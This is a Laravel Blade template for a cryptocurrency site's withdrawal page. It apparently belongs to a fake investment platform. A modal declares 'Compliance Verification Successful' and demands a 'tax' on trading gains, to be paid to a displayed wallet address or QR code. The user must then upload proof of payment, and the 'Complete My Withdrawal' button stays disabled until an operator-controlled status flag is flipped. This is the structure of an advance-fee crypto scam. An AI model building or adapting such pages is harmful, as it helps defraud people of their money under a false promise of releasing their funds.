<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>{{site()->name}}</title>
  <link rel="icon" href="{{ site()->favicon ? asset('storage/image/'.site()->favicon) : asset('assets/img/favicon.svg') }}" type="image/x-icon">
    <link rel="stylesheet" href="{{asset('assets/css/style.css')}}">
    <script src="{{asset('assets/js/jquery-3.4.1.min.js')}}"></script>

    <script src='https://cdn.datatables.net/1.13.7/js/jquery.dataTables.min.js'></script>
         <!-- toastrs css-->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" integrity="sha512-vKMx8UnXk60zUwyUnUPM3HbQo8QfmNx7+ltw8Pm5zLusl1XIfwcxo8DbWCqMGKaWeNxWA8yrx5v3SaVpMvR3CA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js" integrity="sha512-VEd+nq25CkR676O+pLBnDW09R7VQX9Mdiij052gVCp5yVH3jGtH70Ho/UUv4mJDsEdTvqRCFZg0NKGiojGnUCw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>
<style>
    p{
        font-size: 14px !important;
        font-weight: bold;
    }
</style>
<body>
    <div style="min-height:100vh;background-color: #0b0e11;padding:0;margin:0">
        <div class="modal fade" id="withdrawals" tabindex="-1" role="dialog modal-md" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered modal-md" role="document"> 
                <div class="modal-content">
                    <br>
                    <div class="modal-header" style="display:flex;justify-content:center;align-items:center;padding:20px; background: #f8f9fa;">
                        <h4 style="font-weight: 800; color: #1a202c;">Compliance Verification Successful</h4>
                    </div>
                    <div class="modal-body">
                        <div class="row animate__animated animate__fadeIn " style="padding-top: 10px; padding-bottom: 10px">
                            <div class="col-12">
                                @if(session('status'))
                                <p class='text-success'>{{session('status')}} {{$name}}</p>
                                @endif
                                <p>Your Tax amount incurred is : {{number_format($value,5)}}  {{strtolower($name)}} (<span id="bal"></span>)</p>
                                <p>Your Tax is calculated as {{$tax->percentage}}% of your trading gains </p>

                                <img style="width: 100%; height: auto; max-height: 500px; object-fit: contain;" src="{{asset('storage/image/'.$data->image)}}" alt="Compliance Clearance">
                                <br>
                                <br>

                                <p>Please complete your Tax payment by sending the sum of <span id="bal2"></span> by scanning the QR code above or copy the wallet address below.</p>

                                <br><br><input  id="address" type='text' class="form-control" value='{{$data->address}}'></h3>
                                <button id="copy" class="btn btn-primary btn-sm mb-4 mt-2">Copy address</button>

                                <p class='text-dark'>Payment successful ? please click <a id="upload_click" href="#" >here</a></p>
                               @if(isset($proof))
                                  @if($proof->status_two == '0')
                                    <a disabled  class="btn btn-block btn-sm btn-primary text-light">Complete My Withdrawal</a>
                                  @else
                                    <a href="{{route('withdrawal.complete')}}" class="btn btn-block btn-sm btn-primary">Complete My Withdrawal</a>
                                  @endif
                               @else
                                    <a disabled  class="btn btn-block btn-sm btn-primary text-light">Complete My Withdrawal</a>
                               @endif
                            </div>
                        </div>
                    </div>
                    <br>
                </div>
            </div>
        </div>
    </div>
    <div class="modal fade" id="payment" tabindex="-1" role="dialog modal-md" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-md" role="document"> 
            <div class="modal-content">
                <br>
                <div class="modal-header">
                    <h4 class="modal-title animate__animated animate__fadeInDown" id="" style="font-weight: bold; color: black;">Upload Payment</h4>
                    <!-- <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                    </button> -->
                </div>
                <div class="modal-body">
                    <form method="post" action="{{route('tax.upload-proof-two')}}" enctype="multipart/form-data">
                        @csrf
                        <div class="form-group">
                            <input type="file" class="form-control" name="file">
                        </div>
                        <div class="form-group">
                            <input type="submit" value="upload" class="btn btn-sm btn-primary btn-block">
                        </div>
                    </form>
                </div>
                <br>
            </div>
        </div>
    </div>
@if(session('status'))
   <script>
      toastr.success("{{session('status')}}",'successful')
   </script>
@endif
</body>
</html>
<script>
    getAPi('{{strtolower($name)}}','bal','{{number_format($value,8)}} ')
    
    getAPi('{{strtolower($name)}}','bal2','{{number_format($value,8)}} ')

    async function getAPi(assets,div,coin){
        try {
            // Fetch current price
            const responseCurrent = await fetch('https://api.coincap.io/v2/assets/'+assets);
            const dataCurrent = await responseCurrent.json();
            const currentPrice = parseFloat(dataCurrent.data.priceUsd) * coin;

            document.getElementById(div).innerText = '$'+currentPrice.toFixed(2)

        }catch(error){
           console.log(error)
        }

    }
  $("#copy").on('click',function(){
    let code =  $("#address").val();

    navigator.clipboard.writeText(code).then(function(){
    alert('Wallet address copied to clipboard: ' + code)
    }).catch(function(err) {
    console.error('Failed to copy text to clipboard:', err);
    });
  })
    $(document).ready(function(){
        $('#withdrawals').modal('show')
    })

    $("#upload_click").click(function(){
        $('#withdrawals').modal('hide')
        $('#payment').modal('show')
    })
</script>

<script src="{{asset('assets/js/popper.min.js')}}"></script>
<script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
